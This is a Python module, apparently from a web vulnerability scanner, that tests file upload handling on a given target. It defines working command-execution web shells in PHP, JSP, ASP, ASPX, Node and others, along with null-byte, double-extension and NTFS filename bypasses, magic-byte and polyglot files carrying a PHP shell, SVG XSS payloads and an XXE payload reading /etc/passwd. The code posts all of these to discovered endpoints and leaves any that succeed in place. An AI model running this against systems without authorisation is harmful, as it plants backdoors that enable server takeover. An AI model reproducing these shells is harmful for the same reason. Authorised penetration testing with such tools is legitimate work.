"""Deep file upload bypass detection — content-type bypass, double extension, polyglot, null byte, magic bytes."""

import httpx
import re
import os
import asyncio

# --- Shell Payloads ---
PHP_SHELL = "<?php system($_GET['cmd']); ?>"
PHP_SHELL_ALT = "<?php echo shell_exec($_GET['cmd']); ?>"
PHP_EVAL = "<?php eval($_POST['code']); ?>"
PHP_SHORT = "<?=`$_GET[cmd]`?>"
JSP_SHELL = '<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>'
JSP_SHELL_ALT = '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
ASP_SHELL = '<% Execute(Request("cmd")) %>'
ASPX_SHELL = '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(Request["cmd"]); %>'
PYTHON_SHELL = 'import os;os.system("id")'
RUBY_SHELL = '`id`'
PERL_SHELL = '`id`'
NODE_SHELL = 'require("child_process").execSync("id")'

# --- Shell Payloads by Language ---
SHELL_PAYLOADS = [
    ("php_basic", PHP_SHELL, "application/x-php", ".php"),
    ("php_alt", PHP_SHELL_ALT, "application/x-php", ".php"),
    ("php_eval", PHP_EVAL, "application/x-php", ".php"),
    ("php_short", PHP_SHORT, "application/x-php", ".php"),
    ("jsp_basic", JSP_SHELL, "application/jsp", ".jsp"),
    ("jsp_alt", JSP_SHELL_ALT, "application/jsp", ".jsp"),
    ("asp_basic", ASP_SHELL, "application/asp", ".asp"),
    ("aspx_basic", ASPX_SHELL, "application/aspx", ".aspx"),
    ("python_basic", PYTHON_SHELL, "text/x-python", ".py"),
    ("ruby_basic", RUBY_SHELL, "text/x-ruby", ".rb"),
    ("perl_basic", PERL_SHELL, "text/x-perl", ".pl"),
    ("node_basic", NODE_SHELL, "text/javascript", ".js"),
]

# --- Bypass Filename Variants ---
def _generate_filenames(original_name: str, ext: str) -> list[str]:
    """Generate filename bypass variants."""
    base = original_name.replace(ext, "")
    variants = []

    # Double extensions
    variants.append(f"{base}{ext}.jpg")
    variants.append(f"{base}{ext}.png")
    variants.append(f"{base}{ext}.gif")
    variants.append(f"{base}{ext}.svg")
    variants.append(f"{base}{ext}.html")
    variants.append(f"{base}{ext}.txt")

    # Triple extensions
    variants.append(f"{base}{ext}.jpg.png")
    variants.append(f"{base}{ext}.png.jpg")

    # Case variation
    variants.append(f"{base}{ext.upper()}")
    variants.append(f"{base}{ext.lower()}")
    variants.append(f"{base}{ext.capitalize()}")
    variants.append(f"{base}.Php")
    variants.append(f"{base}.PHP")
    variants.append(f"{base}.pHp")

    # Null byte variants
    variants.append(f"{base}{ext}%00.jpg")
    variants.append(f"{base}{ext}\x00.jpg")
    variants.append(f"{base}{ext}%00.png")
    variants.append(f"{base}{ext}\x00.png")

    # Semicolon variants (IIS)
    variants.append(f"{base}{ext};.jpg")
    variants.append(f"{base}{ext};.png")
    variants.append(f"{base}{ext}%.jpg")
    variants.append(f"{base}{ext}%.png")

    # Space variants
    variants.append(f"{base} {ext}")
    variants.append(f"{base}  {ext}")
    variants.append(f"{base}{ext} ")
    variants.append(f"{base}\t{ext}")

    # Special characters
    variants.append(f"{base}{ext}:")
    variants.append(f"{base}{ext}::$DATA")
    variants.append(f"{base}{ext}::$index_allocation")
    variants.append(f"{base}{ext}.")

    # Dot variants
    variants.append(f".{base}{ext}")
    variants.append(f"._{base}{ext}")
    variants.append(f" {base}{ext}")

    # Truncation variants (very long names)
    variants.append(f"{base}{'A' * 200}{ext}")

    return variants


# --- Content-Type Bypass Variants ---
CONTENT_TYPE_BYPASSES = [
    ("image/jpeg", "JPEG image"),
    ("image/png", "PNG image"),
    ("image/gif", "GIF image"),
    ("image/svg+xml", "SVG image"),
    ("image/webp", "WebP image"),
    ("application/pdf", "PDF document"),
    ("text/plain", "Plain text"),
    ("application/octet-stream", "Binary stream"),
    ("application/json", "JSON"),
    ("text/html", "HTML"),
    ("application/x-www-form-urlencoded", "URL-encoded form"),
    ("multipart/form-data", "Multipart form"),
]

# --- Magic Bytes for Image Files ---
MAGIC_BYTES = [
    ("jpg", b'\xff\xd8\xff\xe0', "JPEG"),
    ("png", b'\x89PNG\r\n\x1a\n', "PNG"),
    ("gif", b'GIF89a', "GIF"),
    ("gif87", b'GIF87a', "GIF87"),
    ("bmp", b'BM', "BMP"),
    ("pdf", b'%PDF', "PDF"),
    ("zip", b'PK', "ZIP/DOCX"),
    ("rar", b'Rar!', "RAR"),
    ("7z", b'7z\xbc\xaf\x27\x1c', "7Z"),
]

# --- SVG XSS Payloads ---
SVG_XSS_PAYLOADS = [
    '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
    '<svg><script>alert(1)</script></svg>',
    '<svg><img src=x onerror="alert(1)"/></svg>',
    '<svg onload="alert(1)"/>',
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>',
]

# --- Polyglot Files ---
POLYGLOT_PAYLOADS = [
    ("gif_png_polyglot", b'GIF89a\x00\x00\x89PNG\r\n\x1a\n', "GIF/PNG polyglot"),
    ("jpg_php_polyglot", b'\xff\xd8\xff\xe0' + PHP_SHELL.encode(), "JPG/PHP polyglot"),
    ("pdf_php_polyglot", b'%PDF-1.4\n' + PHP_SHELL.encode(), "PDF/PHP polyglot"),
    ("zip_php_polyglot", b'PK\x03\x04' + PHP_SHELL.encode(), "ZIP/PHP polyglot"),
]

# --- Upload Endpoint Discovery ---
UPLOAD_ENDPOINTS = [
    "/upload", "/api/upload", "/api/v1/upload", "/api/v2/upload",
    "/file/upload", "/files/upload", "/upload/file", "/upload/files",
    "/upload.php", "/upload.jsp", "/upload.asp", "/upload.aspx",
    "/uploads", "/api/files", "/api/attachments",
    "/admin/upload", "/admin/file/upload",
    "/media/upload", "/media/upload",
    "/attachments/upload", "/documents/upload",
    "/api/media/upload", "/api/documents/upload",
]


def _make_shell_with_magic(magic_bytes: bytes, shell_code: str) -> bytes:
    """Prepend magic bytes to shell code to bypass content validation."""
    return magic_bytes + b'\x00\x00' + shell_code.encode()


async def upload_bypass(target: str) -> dict:
    """Deep file upload bypass detection with content-type, magic bytes, polyglot, null byte."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    from urllib.parse import urlparse
    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"

    # Discover upload endpoints
    upload_urls = [target]
    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=False) as client:
        # Check for upload endpoints
        for endpoint in UPLOAD_ENDPOINTS:
            try:
                resp = await client.get(f"{base}{endpoint}")
                if resp.status_code in (200, 301, 302, 405):
                    upload_urls.append(f"{base}{endpoint}")
            except Exception:
                continue

        # Check main page for upload forms
        try:
            main_resp = await client.get(target)
            form_actions = re.findall(r'action=["\']([^"\']*(?:upload|file|attach)[^"\']*)["\']', main_resp.text, re.I)
            for action in form_actions:
                upload_url = action if action.startswith("http") else f"{base}/{action.lstrip('/')}"
                upload_urls.append(upload_url)
        except Exception:
            pass

        upload_urls = list(dict.fromkeys(upload_urls))[:5]  # Dedupe, limit 5

    results = []
    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=False) as client:
        for upload_url in upload_urls:
            # --- Basic Shell Uploads ---
            for shell_name, shell_code, content_type, ext in SHELL_PAYLOADS:
                filenames = _generate_filenames("test", ext)
                for filename in filenames[:3]:  # Limit per shell type
                    try:
                        files = {"file": (filename, shell_code, content_type)}
                        resp = await client.post(upload_url, files=files)
                        body = resp.text.lower()

                        error_keywords = ["error", "invalid", "not allowed", "forbidden", "rejected", "type", "malicious", "blocked"]
                        success_keywords = ["success", "uploaded", "ok", "url", "path", "filename", "saved"]

                        blocked = any(k in body[:500] for k in error_keywords)
                        uploaded = any(k in body[:500] for k in success_keywords) or (resp.status_code in (200, 201) and not blocked)

                        # Try to extract upload path
                        upload_path = ""
                        path_match = re.search(r'(?:url|path|file)["\s:=]+["\']?([^"\'<>\s]+)', resp.text)
                        if path_match:
                            upload_path = path_match.group(1)

                        results.append({
                            "endpoint": upload_url,
                            "technique": "shell_upload",
                            "shell_type": shell_name,
                            "filename": filename,
                            "content_type": content_type,
                            "status": resp.status_code,
                            "uploaded": uploaded,
                            "blocked": blocked,
                            "upload_path": upload_path,
                            "risk": "CRITICAL" if uploaded else "NONE",
                            "confidence": "confirmed" if uploaded else "none",
                        })
                        if uploaded:
                            break  # Found working bypass, skip other filenames
                    except Exception:
                        continue
                if any(r["uploaded"] for r in results if r["shell_type"] == shell_name):
                    break

            # --- Content-Type Bypass ---
            for ct, desc in CONTENT_TYPE_BYPASSES[:5]:
                try:
                    files = {"file": ("shell.php", PHP_SHELL, ct)}
                    resp = await client.post(upload_url, files=files)
                    body = resp.text.lower()
                    blocked = any(k in body[:500] for k in ["error", "invalid", "not allowed", "forbidden"])
                    uploaded = resp.status_code in (200, 201) and not blocked

                    if uploaded:
                        results.append({
                            "endpoint": upload_url,
                            "technique": "content_type_bypass",
                            "content_type": ct,
                            "description": desc,
                            "status": resp.status_code,
                            "uploaded": True,
                            "risk": "CRITICAL",
                        })
                except Exception:
                    continue

            # --- Magic Bytes + Shell ---
            for magic_name, magic_bytes, desc in MAGIC_BYTES[:4]:
                for shell_name, shell_code, _, ext in SHELL_PAYLOADS[:3]:
                    try:
                        polyglot_content = _make_shell_with_magic(magic_bytes, shell_code)
                        files = {"file": (f"test{ext}", polyglot_content, "application/octet-stream")}
                        resp = await client.post(upload_url, files=files)
                        body = resp.text.lower()
                        blocked = any(k in body[:500] for k in ["error", "invalid", "not allowed", "forbidden"])
                        uploaded = resp.status_code in (200, 201) and not blocked

                        if uploaded:
                            results.append({
                                "endpoint": upload_url,
                                "technique": "magic_bytes_bypass",
                                "magic_type": desc,
                                "shell_type": shell_name,
                                "filename": f"test{ext}",
                                "status": resp.status_code,
                                "uploaded": True,
                                "risk": "CRITICAL",
                            })
                            break
                    except Exception:
                        continue
                if any(r["technique"] == "magic_bytes_bypass" for r in results):
                    break

            # --- SVG XSS Upload ---
            for i, svg_payload in enumerate(SVG_XSS_PAYLOADS):
                try:
                    files = {"file": (f"xss_{i}.svg", svg_payload, "image/svg+xml")}
                    resp = await client.post(upload_url, files=files)
                    body = resp.text.lower()
                    blocked = any(k in body[:500] for k in ["error", "invalid", "not allowed", "forbidden"])
                    uploaded = resp.status_code in (200, 201) and not blocked

                    if uploaded:
                        results.append({
                            "endpoint": upload_url,
                            "technique": "svg_xss_upload",
                            "filename": f"xss_{i}.svg",
                            "status": resp.status_code,
                            "uploaded": True,
                            "risk": "HIGH",
                        })
                except Exception:
                    continue

            # --- Polyglot Files ---
            for polyglot_name, polyglot_bytes, desc in POLYGLOT_PAYLOADS:
                try:
                    files = {"file": (f"polyglot.test", polyglot_bytes, "application/octet-stream")}
                    resp = await client.post(upload_url, files=files)
                    body = resp.text.lower()
                    blocked = any(k in body[:500] for k in ["error", "invalid", "not allowed", "forbidden"])
                    uploaded = resp.status_code in (200, 201) and not blocked

                    if uploaded:
                        results.append({
                            "endpoint": upload_url,
                            "technique": "polyglot_upload",
                            "polyglot_type": desc,
                            "status": resp.status_code,
                            "uploaded": True,
                            "risk": "CRITICAL",
                        })
                except Exception:
                    continue

    return {
        "target": target,
        "upload_endpoints_tested": upload_urls,
        "results": results,
        "upload_bypass_possible": any(r.get("uploaded") for r in results),
        "total_findings": len([r for r in results if r.get("uploaded")]),
        "techniques_found": list(set(r["technique"] for r in results if r.get("uploaded"))),
        "risk_summary": {
            "critical": sum(1 for r in results if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results if r.get("risk") == "MEDIUM"),
        },
    }
